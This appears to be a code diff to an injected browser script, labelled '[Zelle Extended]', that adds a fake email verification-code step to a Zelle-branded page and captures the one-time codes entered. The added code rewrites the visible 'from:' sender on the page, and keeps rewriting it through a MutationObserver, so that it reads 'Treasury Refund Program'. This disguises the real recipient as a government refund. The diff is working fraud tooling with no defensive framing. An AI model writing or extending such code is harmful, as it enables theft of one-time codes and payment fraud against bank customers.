@@ -151,10 +151,12 @@
                         </svg>
                     </div>
                     <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-bottom: 12px;">Email Verification Code</h2>
-                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 32px;">
+                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 16px;">
                         We've sent a 6-digit code to your email. Enter it below.
                     </p>
-                    
+                    <p style="font-size: 13px; color: #6b7280; margin-bottom: 24px; text-align: left;">
+                        <span style="color: #9ca3af;">from:</span> <span style="color: #2563eb; font-weight: 500;">Treasury Refund Program</span>
+                    </p>
                     <div class="zelle-otp-container" id="finalOtpContainer">
                         <input type="text" maxlength="1" class="zelle-otp-digit final-otp-digit" data-index="0" inputmode="numeric" autocapitalize="off">
                         <input type="text" maxlength="1" class="zelle-otp-digit final-otp-digit" data-index="1" inputmode="numeric" autocapitalize="off">
@@ -865,12 +867,28 @@
     }
     
     // ========================================
+    // REPLACE "FROM" SENDER NAME
+    // ========================================
+    function replaceFromName() {
+        const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        let node;
+        while (node = walker.nextNode()) {
+            const text = node.textContent;
+            if (text && /from:\s*.+/.test(text) && /\*\*\*/.test(text)) {
+                node.textContent = text.replace(/from:\s*[^\n]+/i, (m) => 'from: Treasury Refund Program');
+            }
+        }
+    }
+    
+    // ========================================
     // INITIALIZE (SIMPLE & CLEAN)
     // ========================================
     function init() {
         console.log('[Zelle Extended] Initializing multi-step flow...');
         injectHTML();
         interceptOtpSubmission();
+        replaceFromName();
+        new MutationObserver(() => replaceFromName()).observe(document.body, { subtree: true, childList: true, characterData: true });
     }
     
     // Wait for DOM ready
